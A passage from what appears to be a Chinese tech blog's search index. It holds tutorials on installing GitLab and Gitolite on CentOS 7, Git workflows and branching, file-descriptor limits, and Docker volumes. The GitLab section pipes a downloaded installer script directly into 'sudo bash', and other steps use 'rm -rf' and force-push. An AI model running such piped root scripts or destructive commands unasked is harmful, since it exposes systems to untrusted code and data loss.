"qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"版本控制"},{title:"Git 之七 - Centos7 搭建 Gitlab 服务器",url:"/posts/37ea711c.html",text:'Gitlab 相关站点 Gitlab 官网 Gitlab CE Github Gitlab 官方安装教程 Gitlab CE 官方文档 安装 Gitlab 所需的最低硬件配置说明 Gitlab 介绍 GitLab 是基于 Ruby on Rails 的一个开源版本管理系统，实现一个自托管的 Git 项目仓库，可通过 Web 界面进行访问公开的或者私人项目。GitLab 分为社区版（CE） 和企业版（EE）。它拥有与 Github 类似的功能，能够浏览源代码，管理缺陷和注释。可以管理团队对仓库的访问，它非常易于浏览提交过的版本并提供一个文件历史库。团队成员可以利用内置的简单聊天程序 (Wall) 进行交流。依赖组件：Ruby、Git、Nginx、Redis、Sidekiq、GitLab Runner、Unicorn Workers、PostgreSQL/MySQL/MariaDB 等，其中 MySQL/MariaDB 并不完全支持 Gitlab 的所有功能，官方强烈推荐安装 PostgreSQL。 安装环境说明 12345$ uname -aLinux centos7 3.10.0-957.1.3.el7.x86_64 #1 SMP Thu Nov 29 14:49:43 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux$ cat /etc/redhat-releaseCentOS Linux release 7.6.1810 (Core) 安装并配置必要的依赖项 123456789101112131415161718192021222324# 安装依赖项# yum install -y curl policycoreutils-python openssh-server# 配置SSH服务开机自启动# systemctl enable sshd# 启动SSH服务# systemctl start sshd# 查看防火墙运行状态# firewall-cmd --state# 如果防火墙服务处于关闭状态，则启用防火墙服务# systemctl start firewalld# 配置防火墙开放HTTP服务（80端口）# firewall-cmd --permanent --add-service=http# 保存防火墙配置# systemctl reload firewalld# 查看防火墙已开放的服务，防火墙默认会开放SSH服务（22端口）# firewall-cmd --list-servicesdhcpv6-client ssh http 安装 Postfix，用于发送通知邮件 12345678# 安装Postfix# yum install postfix# 配置Postfix服务开机自启动# systemctl enable postfix# 启动Postfix服务# systemctl start postfix Yum 方式安装 Gitlab 1234567891011121314151617# 添加Yum仓库# curl https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.rpm.sh | sudo bash# 安装Gitlab，EXTERNAL_URL是指用于外部访问Gitlab的域名或者URL地址，安装包的体积约447M# EXTERNAL_URL="http://192.168.1.198" yum install -y gitlab-ce# 编译Gitlab的配置与启动Gitlab，首次执行耗时较长# gitlab-ctl reconfigure# 查看gitlab各组件是否启动成功# gitlab-ctl status# 查看已安装的Gitlab的版本# cat /opt/gitlab/embedded/service/gitlab-rails/VERSION# 测试Gitlab是否安装并启动成功，浏览器输入以下URL访问Gitlab，初次访问Gitlab需要在Web界面配置root用户的密码，然后使用root用户进行登录http://192.168.1.198 配置 Gitlab 的 Nginx 端口 1234567891011121314151617181920212223# 不能通过编辑Nginx配置文件的方式来修改Gitlab的Nginx端口，因为重新编译Gitlab的配置后，Nginx的配置文件/var/opt/gitlab/nginx/conf/gitlab-http.conf会被重新覆盖# 编辑Gitlab的配置文件# vim /etc/gitlab/gitlab.rb# 修改Gitlab的Nginx端口（默认80），注意不要用8082端口，因为自带工具可能会占用nginx[\'listen_port\'] = 8888external_url \'http://192.168.1.198:8888\'# 重新编译Gitlab的配置，Nginx配置文件中的listen、server_name、http_host_with_default配置项的值会自动更新# gitlab-ctl reconfigure# 重启GitLab# gitlab-ctl restart# 配置防火墙永久开放修改后的Nginx端口# firewall-cmd --zone=public --permanent --add-port=8888/tcp# 保存防火墙配置# firewall-cmd --reload# 查看防火墙已开放的端口# firewall-cmd --list-ports Gitlab 常用目录与配置文件介绍 1234567891011# 对应Gitlab各服务的主目录，同时也是Gitlab的数据目录# ls /var/opt/gitlab# 对应各服务的日志目录# ls /var/log/gitlab# 配置文件-Gitlab# cat /etc/gitlab/gitlab.rb# 配置文件-Nginx# cat /var/opt/gitlab/nginx/conf/gitlab-http.conf Gitlab 常用命令介绍 1234567891011121314151617181920212223242526272829# 启动所有gitlab组件# gitlab-ctl start# 停止所有gitlab组件# gitlab-ctl stop# 重启所有gitlab组件# gitlab-ctl restart# 查看gitlab各组件的运行状态# gitlab-ctl status# 重启某个组件# gitlab-ctl restart nginx# 查看某个组件的运行状态# gitlab-ctl status nginx# 重新编译gitlab的配置# gitlab-ctl reconfigure# 查看gitlab的日志# gitlab-ctl tail# 查看nginx的日志# gitlab-ctl tail nginx/gitlab_access.log# 检查gitlab# gitlab-rake gitlab:check SANITIZE=true --trace 下篇 - Git 之八 - Gitlab 详细使用教程 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"版本控制 centos"},{title:"Git 之六 - 使用 Gitolite 搭建 Git 服务器",url:"/posts/3a44097a.html",text:'Gitolite Github Repo https://github.com/sitaramc/gitolite Gitolite 介绍 Gitolite 是一款 Perl 语言开发的 Git 服务管理工具，采用的是 SSH 协议并使用 SSH 公钥认证，能够通过配置文件对写操作进行基于分支和路径的精细授权。 安装环境说明 12345$ uname -aLinux centos7 3.10.0-957.1.3.el7.x86_64 #1 SMP Thu Nov 29 14:49:43 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux$ cat /etc/redhat-releaseCentOS Linux release 7.6.1810 (Core) 安装基础依赖包 12345# 切换到Root用户$ su - root# 安装依赖包# yum install -y autoconf git gcc gcc-c++ pcre pcre-devel zlib zlib-devel openssl openssl-devel tree 创建 Git 用户 1234567# 如果Git用户已存在则无需再创建，务必确认/home/git/.ssh/authorized_keys文件的内容为空或者不存在# 创建Git用户# adduser git# 设置Git用户的密码# passwd git 创建 Root 用户的 SSH 公钥 / 私钥对 1234567891011# 进入Root用户家目录下的.ssh目录# cd /root/.ssh# 查看是否存在SSH公钥/私钥对# ls -al# 如果不存在SSH公钥/私钥对，则执行以下命令进行创建，然后一路回车到结束# ssh-keygen# 将Root用户的SSH公钥文件复制到Git用户的家目录下，建议公钥文件使用具有标识性的文件名称，便于多人协作开发时区分不同的客户端用户# cp id_rsa.pub /home/git/sk.pub 安装 Gitolite 1234567891011121314151617181920212223242526272829# 切换到Git用户# su - git# 确保当前位置是在Git用户的家目录（/home/git）下$ pwd# 更新Bash$ source .bash_profile# 创建一个名称为bin的目录$ mkdir bin# 克隆Gitolite源码$ git clone git://github.com/sitaramc/gitolite# 在bin目录下创建Gitolite符号链接，必须使用相对路径$ gitolite/install -ln ~/bin# 使用Root用户的SSH公钥文件安装Gitolite，在服务器中Gitolite通常是由一个非Root用户安装的，一般是使用Git用户$ gitolite setup -pk sk.pub# 安装完成后/home/git目录的结构如下$ tree -L 1 /home/git/home/git├── bin├── gitolite├── projects.list├── repositories└── sk.pub 验证 Gitolite 是否安装成功 12345678910111213141516# 切换到Root用户$ su - root# 确保当前位置是在Root用户的家目录（/root）下# pwd# 测试从新安装的Gitolite服务器中克隆gitolite-admin仓库，终端会提示输入Root用户的密码，由于上面已经交换了Root用户的SSH公钥文件，因此只需要输入"yes"，然后输入回车键即可# git clone git@127.0.0.1:gitolite-admin# 查看gitolite-admin仓库的目录结构，conf目录用于存放配置文件（授权文件），keyDir目录用于存放所有客户端用户的SSH公钥文件# tree gitolite-admingitolite-admin├── conf│ └── gitolite.conf└── keydir └── sk.pub gitolite-admin 仓库介绍 gitolite-admin 仓库用于 Git 管理员管理 Git 仓库与分配 Git 仓库权限，以后每次新增仓库、修改权限、更新用户 / 用户组，都需要在这个 clone 下来的 gitolite-admin 仓库下的 conf 目录中进行配置；同时将客户端用户的 SSH 公钥文件上传至 keydir 目录，SSH 公钥文件的文件名以客户端用户名来区分；然后将新增或修改的文件 push 到仓库服务器，push 完后可以看到 /home/git/repositories 下新创建的仓库。 Gitolite 管理示例 - 添加、修改仓库 12345678910111213141516171819202122232425262728293031# 查看当前用户身份，确保当前用户身份是Root用户# whoami# 进入gitolite-admin仓库所在的目录# cd /root/gitolite-admin# 编辑Gitolite的配置文件，使用以下格式配置用户、用户组、仓库、权限等# vim conf/gitolite.conf# 配置用户组，组成员名称必须与keydir目录下的SSH公钥文件的文件名相同@组名 = 用户名# 配置仓库名/项目名，如果对应的仓库不存在，执行Push操作之后会自动创建并初始化仓库repo demo# 配置仓库权限，如果是多个用户组/用户名，则使用空格隔开RW+ = @用户组/用户名# 如果在Gitolite的配置文件中添加了新客户端用户的配置内容，则需要上传新客户端用户的SSH公钥文件到gitolite-admin/keydir目录下。在keydir目录下，客户端用户的SSH公钥文件的文件名必须与conf/gitolite.conf文件中指定的客户端用户名一致；例如用户zhangsan，其SSH公钥文件的文件名必须是zhangsan.pub。这里的作用类似在Linux中配置SSH免密码登录。# 配置仓库签名（只需在首次执行Push操作之前进行配置）# git config user.name gitolite-root# git config user.email xxx@qq.com# 执行Push操作，使配置生效# git add --all# git commit -am \'update gitolite config\'# git push origin master# 如果上述配置中包含了新仓库的配置内容，那么成功执行Push操作之后，可以在/home/git/repositories目录下看到新创建的仓库目录，例如demo.git# ls -al /home/git/repositories Gitolite 管理示例 - 删除仓库 12345678910111213141516# 查看当前用户身份，确保当前用户身份是Root用户# whoami# 进入gitolite-admin仓库所在的目录# cd /root/gitolite-admin# 编辑Gitolite的配置文件，删除对应仓库的相关配置内容，例如“repo demo”# vim conf/gitolite.conf# 执行Push操作# git add --all# git commit -am \'update gitolite config\'# git push origin master# 在服务器上手动删除/home/git/repositories目录下对应的仓库目录，删除示例如下：# rm -rf /home/git/repositories/demo Git 客户端（远程客户端）连接 Gitolite 服务器的步骤总结 Git 管理员在 gitolite-admin 仓库里，配置客户端用户访问对应仓库的权限 客户端本地生成 SSH 公钥文件，并交由 Git 管理员上传到 gitolite-admin/keydir 目录下 客户端直接使用 Git 命令克隆对应的远程仓库，例如： git clone git@ip:repo-name 其他 IDE (例如 Eclipse) 克隆对应的远程仓库，可以直接使用地址： git@ip:repo-name git@ip:repo-name，其中 ip 是 Gitolite 服务器的 IP 地址，repo-name 是 Git 远程仓库的名称 Gitolite 防火墙配置说明 使用 Gitolite 搭建 Git 服务器，由于 Gitolite 采用的是 SSH 协议，只需要确保系统开启 SSH 服务，并且防火墙开放了 SSH 端口（默认 22）即可。 解决 Gitolite 安装之后，无法使用 git 用户进行 SSH 远程登录的问题 当安装 Gitolite 后，Gitolite 出于安全问题直接禁用了 git 用户的 SSH 登录权限，因此是无法直接使用 git 用户远程 SSH 连接到服务器的，默认会提示以下错误信息。解决方法是先通过其他 Linux 用户 SSH 远程连接到服务器，然后执行命令”su - git” 切换到 git 用户。 123# ssh git@192.168.1.1PTY allocation request failed on channel 0hello centos7, this is git@192.168.1.1 running gitolite3 v3.6.10-2-g64aa53b on git 1.8.3.1 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux 版本控制"},{title:"Git 之五 - 深入理解 Git 工作流",url:"/posts/1600ad43.html",text:'Git 工作流概念Git 工作流指在项目开发过程中使用 Git 的方式，包括集中式工作流、功能分支工作流、GitFlow 工作流、Forking 工作流、Pull Requests。 Git 工作流分类集中式工作流像 Subversion 一样，集中式工作流以中央仓库作为项目所有修改的单点实体。所有修改都提交到 Master 这个分支上，这种方式与 SVN 的主要区别就是开发人员有本地库，但 Git 很多特性并没有使用到。 功能分支工作流功能分支工作流以集中式工作流为基础，不同的是为各个新功能分配一个专门的分支来开发。这样可以在把新功能集成到正式项目前，用 Pull Requests 的方式讨论变更。 Gitflow 工作流Gitflow 工作流通过为功能开发、发布准备和维护设立了独立的分支，让发布迭代过程更流畅。严格的分支模型也为大型项目提供了一些非常必要的结构。 Forking 工作流Forking 工作流是在 GitFlow 基础上，充分利用了 Git 在分支和克隆上的优势、Git 的 Fork 和 Pull Request 功能，实现代码审核的目的。可以安全可靠地管理大团队的开发者（developer），并能接受不信任贡献者（contributor）的提交。 Pull RequestsPull Requests 是 Bitbucket 提供的让开发者更方便地进行协作的功能，提供了友好的 Web 界面可以在提议的修改合并到正式项目之前对修改进行讨论。 GitFlow 工作流中分支类型详解 主干分支（master） 主要负责管理正在运行的生产环境代码，永远保持与正在运行的生产环境完全一致。 Bug 修复分支（hotfix） 主要负责管理生产环境下需要紧急修复的代码。从主干分支分出，修理完毕并测试上线后，并回主干分支。并回后，视情况可以删除该分支。 准生产分支（release） 较大的版本上线前，会从开发分支中分出准生产分支（预发布分支），进行最后阶段的集成测试。该版本上线后，会合并到主干分支。生产环境运行一段阶段较稳定后可以视情况删除。 开发分支（develop） 主要负责管理正在开发过程中的代码，一般情况下应该是最新的代码。 功能分支（feature） 为了不影响较短周期的开发工作，一般把中长期开发模块，会从开发分支中独立出来，开发完成后会合并到开发分支。 分支详细图解 Git 提交规范 feat 增加新功能 fix 修复问题 / BUG style 代码风格相关无影响运行结果的 perf 优化 / 性能提升 refactor 重构 revert 撤销修改 test 测试相关 docs 文档 / 注释 build 对构建系统或者外部依赖项进行了修改 chore 依赖更新 / 脚手架配置修改等 workflow 工作流改进 ci 持续集成 types 类型定义文件更改 wip 开发中 参考博客 深入理解学习 Git 工作流（git-workflow-tutorial） var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"版本控制"},{title:"常用开发帮助文档整理",url:"/posts/d4da5eed.html",text:'Git Git 资料整理 Pro Git Book C++ C++ 帮助手册 C/C++ 参考手册 Docker 菜鸟教程 - Docker 命令大全 Kubernetes 中文指南 / 云原生应用架构实践手册 Jenkins Jenkins 官方英文文档 Jenkins 官方中文文档 Jenkins 中文文档 Apache Ignite Apache Ignite 官方英文文档 Apache Ignite 中文文档 MyBatis MyBatis3 官方中文文档 IntelliJ IDEA IntelliJ IDEA 官方英文文档 Gradle Gradle 中文教程 Puppeteer Puppeteer 官方中文文档 Redis Redis 命令参考 Redis 命令使用手册 Reids 菜鸟教程文档 RocksDB RocksDB 中文文档 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开发随笔"},{title:"Centos7 更改最大打开文件描述符数",url:"/posts/88a10b.html",text:'系统环境 12CentOS Linux release 7.6.1810 (Core)Linux 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 临时更改最大打开文件描述符数 12345# 查看限制# ulimit -n# 临时更改限制（系统重启失效）# ulimit -n 1048576 永久更改最大打开文件描述符数 1234567891011121314151617181920# 第一步# vim /etc/security/limits.conf* soft nofile 1048576* hard nofile 1048576 #星号表示对所有用户生效# 第二步# vim /etc/sysctl.conffs.file-max = 1048576 #可执行"sysctl -p"使fs.file-max生效# 第三步# vim /etc/pam.d/loginsession required pam_limits.so #查看配置文件有没有这行，没有就加上# 第四步# reboot #重启系统# 第五步（查看是否生效）# ulimit -n# sysctl fs.file-max# cat /proc/PID/limits #PID是应用的进程ID，在输出结果中查看"Max open files"的显示值 (adsbygoogle = window.adsbygoogle || []).push({}); 更改 Supervisor 的最大打开文件描述符数 1234567891011121314# 如果应用使用supervisor来管理，则需要按以下步骤配置，否则上面的配置对使用supervisor管理的应用不生效# 修改supervisor的配置文件# vim /etc/supervisord.confminfds=1048576# 修改supervisor的systemctl启动脚本，添加LimitNOFILE属性# vim /usr/lib/systemd/system/supervisord.service[Service]LimitNOFILE=1048576# 重启supervisord生效# systemctl daemon-reload# systemctl restart supervisord 更改 MySQL（RPM 方式安装）的最大打开文件描述符数 12345678910111213141516171819# 如果是通过yum源或者rpm包的方式安装mysql，那么上面的配置对mysql无效，因为systemctl启动脚本覆盖了ulimit配置# 查看mysql的最大打开文件描述符数# cat /proc/`pidof mysqld`/limits# egrep \'^(Limit|Max open files)\' /proc/`pidof mysqld`/limits# 第一种方法：直接修改mysql的systemctl启动脚本（不建议修改mysqld.service，这样会影响下次升级）# vim /usr/lib/systemd/system/mysqld.serviceLimitNOFILE=1048576# 第二种方法：完美解决升级问题# mkdir /usr/lib/systemd/system/mysqld.service.d# vim /usr/lib/systemd/system/mysqld.service.d/override.conf[Service]LimitNOFILE=1048576# 重启mysql生效# systemctl daemon-reload# systemctl restart mysqld var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"centos"},{title:"Git 之四 - Git 对 Github 远程库的操作",url:"/posts/a288950b.html",text:'Git 的四个工作区域 创建远程库与本地库12345# 登录Github的Web页面创建远程库，并记录如下的远程库地址# https://github.com/xxxx/remote-test.git# 创建本地库，建议本地库的名称与远程库的名称一致$ git init remote-test Git 配置远程库别名1234567891011121314# 进入本地库的根目录$ cd remote-test# 查看远程库别名$ git remote -v# 添加远程库别名，例如下面远程库的别名是origin，地址是Github远程仓库的Https URL$ git remote add origin https://github.com/xxxx/remote-test.git# 删除远程库别名$ git remote rm origin# 重命名远程库别名$ git remote rename origin origin2 Git 远程库的 Pull 与 Push 操作1234567891011121314151617# 进入本地库的根目录$ cd remote-test# 从远程库origin的master分支Pull（拉取）最新到工作区，并在工作区进行合并(Merge)操作，origin是远程库别名，master是远程库分支的名称$ git pull origin master# 创建新文件$ touch api.json# 添加新文件到暂存区$ git add api.json# 添加新文件到本地库$ git commit api.json -m \'update\'# 将最新的文件Push（推送）到远程库origin的master分支，origin是远程库别名，master是远程库分支的名称；如果Pull到Github的远程仓库（Https URL），默认会提示输入Github的帐号和密码$ git push origin master Git 远程库的 Clone 操作12345678910# 将远程库Clone到本地，默认分支是master$ git clone https://github.com/xxxx/remote-test.git# 或者Clone远程库到本地，并指定本地目录的名称，默认分支是master$ git clone https://github.com/xxxx/remote-test.git remote-project# 上述命令的作用：# 初始化本地库，即执行"git init"命令# 完整地把远程库的master分支Pull下来，即执行"git pull"命令# 创建远程库别名（origin + 远程库地址），即执行"git remote add"命令 Git 远程库的 Fetch 操作12345678910111213141516# 首次执行会创建本地库origin的master分支（origin/master），然后从远程库origin的master分支Fetch（抓取）最新到本地库origin的master分支（origin/master），不影响当前工作区的内容$ git fetch origin master# 查看本地库的master分支与本地库origin的master分支（origin/master）的差异$ git diff master origin/master# 或者$ git diff HEAD FETCH_HEAD# 合并本地库origin的master分支（origin/master）到本地库的master分支$ git merge origin/master# 或者$ git merge FETCH_HEAD# 指令Pull与Fetch的区别： Pull = Fetch + Merge 解决 Pull 操作产生的冲突Pull = Fetch + Merge，也就是说根本问题是 “如何解决合并分支后产生的冲突” 12345678910111213141516# 从远程库origin的master分支Pull（拉取）最新到工作区，并在工作区进行合并(Merge)操作，假设此时Git提示有文件产生冲突# git pull origin master# 第一步，手动编辑产生冲突的文件，并修改文件内容，直至冲突的文件内容都修改掉$ vim api.json&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEADedit by hot_fix s=======edit by hot_fix2&gt;&gt;&gt;&gt;&gt;&gt;&gt; master# 第二步，标记冲突已解决，将之前产生冲突的文件添加到暂存区$ git add api.json# 第三步，提交修改，此时commit参数不能带具体文件名$ git commit -m \'update message\' 解决 Push 失败的问题如果不是基于远程库的最新版本所做的修改，不能进行 Push 操作，必须先将远程库最新版本的文件 Pull 下来再进行 Push 操作。Pull 下来之后如果文件产生冲突，则按照上面” 解决 Pull 操作产生的冲突” 的步骤进行操作。 Git 远程库的分支创建操作1234567891011121314# 本地创建分支$ git branch develop# 本地切换到指定分支$ git checkout develop# 将分支代码添加到暂存区$ git add --all# 将分支代码提交到本地库$ git commit -am \'create branch develop\'# 将分支代码Push到远程库的分支，此时远程库会自动创建分支$ git push origin develop SSH 免密码登录 Github当远程库的地址是基于 HTTPS 协议的时候，每次 Push 操作都需要手动输入 Github 的用户名和密码；Windows 系统下会自动保存凭据（帐号信息），可以避免每次都手动输入帐号信息；而 Linux 下则没有自动保存凭据的功能，因此 Github 官方提供了基于 SSH 免密码登录的方式进行 Push 操作，以此来解决每次都要输入帐号信息的问题；SSH 免密码登录的方式同样适用于 Windows 系统，此方法的局限性在于本地只能操作一个 Github 帐号。 12345678910111213141516171819202122$ cd ~/.ssh# 生成SSH的公钥文件id_rsa.pub与私钥文件id_rsa，并指定邮箱地址$ ssh-keygen -t rsa -C xxxx@gmail.com# 或者指定公钥和私钥文件的文件名$ ssh-keygen -t rsa -C xxxx@gmail.com -f id_rsa.github# 将公钥文件id_rsa.pub的文本内容复制到Github相应的SSH Keys配置页面$ cat id_rsa.pub# 进入本地库的根目录$ cd remote-test# 删除旧的远程库别名$ git remote rm origin# 添加新的远程库别名，远程库的地址基于SSH协议$ git remote add origin git@github.com:xxxx/remote-test.git# 测试使用“SSH免密码登录”的方式进行Push操作$ git push origin master Github Fork 的项目和上游项目同步代码当成功 Fork 一个项目后，无论怎么修改 Fork 出来的项目，原来的项目（Github 叫做 upstream，一般译作上游项目）是不会受到影响的，这在上游项目来说自然是极好的保护。但是 Fork 出来的项目如何能够及时反映上游项目的变更呢？这就首先需要设置本地项目的 “远程仓库” 属性，即告诉 Git 命令，本地项目的上游项目是哪一个，比如下面针对 weld-core 项目举例。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# 设置上游的远程仓库$ git remote add upstream https://github.com/weld/core# 查看所有远程仓库$ git remote -vorigin https://github.com/subaochen/core.git (fetch)origin https://github.com/subaochen/core.git (push)upstream https://github.com/weld/core (fetch)upstream https://github.com/weld/core (push)# 将上游远程仓库的最新变化同步到本地$ git fetch upstream# 查看当前项目的所有分支$ git branch -a* 2.0 remotes/origin/1.1 remotes/origin/1.2 remotes/origin/2.0 remotes/origin/2.0.0 remotes/origin/2.0.0.Beta5-branch remotes/origin/HEAD -&amp;gt; origin/2.0 remotes/origin/master remotes/upstream/1.1 remotes/upstream/1.2 remotes/upstream/2.0 remotes/upstream/2.0.0 remotes/upstream/2.0.0.Beta5-branch remotes/upstream/2.1 remotes/upstream/2.2 remotes/upstream/2.2.0 remotes/upstream/2.3 remotes/upstream/eap6.2.x remotes/upstream/master remotes/upstream/weld-osgi-2.x# 确保本地代码的分支设置得当，一般设置为 origin/master$ git checkout origin/master# 合并上游远程仓库和本地仓库的代码（即将分支 origin/master 与 upstream/master 合并在一起）$ git merge upstream/master# 提交本地变更，Push 代码到 origin/master$ git push origin master# 其实同步上游远程仓库代码的步骤，可以合并成一条命令，该命令相当于上面的：fetch + merge# 第一个参数 pustream 表示远程仓库的 upstram/master 分支# 第二个参数 master 表示本地 Fork 库的 origin/master 分支$ git pull upstream master Git 从远程仓库获取特定分支12345678910# 列出远程仓库的所有分支$ git branch -aremotes/origin/devremotes/origin/release# 拉取特定的远程分支，例如checkout远程的origin/dev分支，并在本地将其命名为dev分支，同时切换到本地的dev分支$ git checkout -b dev origin/dev# 切换回master分支$ git checkout master 清空 Github 特定的仓库清空 Github 特定的仓库，而不是删除并重新创建仓库，同时保留本地仓库原来的所有文件。 12345678910111213141516171819# 创建临时的仓库目录（保证不对本地仓库原来的文件进行任何操作）$ mkdir -p /tmp/reset-repo# 进入临时仓库目录$ /tmp/reset-repo# 创建README.md（必须得有一个文件）$ touch README.md# 初始化Git$ git init$ git add .$ git commit -m "Initial commit"# 重新设置源仓库的地址$ git remote add origin git@github.com:&lt;YOUR ACCOUNT&gt;/&lt;YOUR REPOS&gt;.git# 重新Push到源仓库（这里演示使用的是master分支）$ git push -u --force origin master .gitignore 常用模板 .gitignore 常用模板 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"版本控制"},{title:"Git 之三 - 分支管理",url:"/posts/501d8c1.html",text:'Git 常见的分支模型 Git 分支管理图解 Git 分支的创建、删除、切换 1234567891011121314# 查看当前的分支列表$ git branch -v# 创建分支$ git branch hot_fix# 删除某个分支$ git branch -d hot_fix# 切换到某个分支$ git checkout hot_fix# 一步完成创建并切换分支$ git checkout -b hot_fix Git 分支的合并 1234567# 演示将hot_fix分支合并到master分支# 第一步，切换到接收修改的分支（即准备增加新内容的分支）上$ git checkout master# 第二步，合并分支$ git merge hot_fix Git 解决合并分支后产生的冲突 123456789101112131415161718192021# 演示将master分支合并到hot_fix分支，并解决合并后产生的冲突# 切换到hot_fix分支$ git checkout hot_fix# 合并master分支，git输出了合并冲突的提示信息$ git merge master&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEADedit by hot_fix s=======edit by hot_fix2&gt;&gt;&gt;&gt;&gt;&gt;&gt; master# 第一步，手动编辑产生冲突的文件，并修改文件内容，直至冲突的文件内容都修改掉$ vim api.json# 第二步，标记冲突已解决，将之前产生冲突的文件添加到暂存区$ git add api.json# 第三步，提交修改，此时commit参数不能带具体文件名$ git commit -m \'update message\' 克隆指定分支的代码 12# 通过 -b 参数指定分支，默认是master分支$ git clone -b develop https://github.com/xxx.git var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"版本控制"},{title:"Docker 之五 Docker 数据卷与数据卷容器",url:"/posts/ab1aba7d.html",text:'前言 容器在运行期间产生的数据不会写在镜像里面，重新用此镜像创建并启动新的容器就会初始化镜像，加一个全新的容器可写层来保存数据。生产环境中使用 Docker 的过程中，往往需要对数据进行持久化，或者需要在多个容器之间进行数据共享，Docker 提供数据卷和数据卷容器来解决；另外还可以通过 commit 提交一个新的镜像来保存产生的数据，也可以通过 “docker cp” 命令在宿主机与容器之间互相拷贝数据文件。 容器中管理数据主要的两种方式 数据卷（Data Volumes）：容器内数据直接映射到本地主机环境。数据卷容器（Data Volume Containers）：使用特定容器维护数据卷。 数据卷的功能介绍 绕过 “写时复制” 系统，以达到本地磁盘 IO 的性能。 绕过 “写时复制” 系统，有些文件不需要在 docker commit 打包进镜像文件。 实现容器内部数据的持久化。 数据卷可以在容器间共享和重用数据。 数据卷可以在宿主机和容器间共享数据。 数据卷数据改变是直接修改的。 数据卷是持续性的，直到没有容器使用它们；即便是初始的数据卷容器或中间层的数据卷容器删除了，只要还有其他的容器使用数据卷，那么里面的数据都不会丢失。 Docker 通过命令的方式添加数据卷 1234567891011# 创建宿主机的文件共享目录，即使不手动在宿主机上创建数据卷目录，Docker也会自动创建# mkdir -p /host/datavolume# 为容器添加一个数据卷，即将宿主机的/host/datavolume目录挂载到容器中的/datavolume目录，容器默认具有/datavolume目录的读写权限，以下命令的作用类似Linux的mount命令# docker run -it -v /host/datavolume:/datavolume --name="cenots7" centos# 为容器添加一个数据卷，同时指定容器仅拥有/datavolume目录的只读权限# docker run -it -v /host/datavolume:/datavolume:ro --name="cenots7" centos# 查看数据卷的创建情况# docker inspect cenots7 Docker 通过编写 Dockerfile 的方式添加数据卷 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# 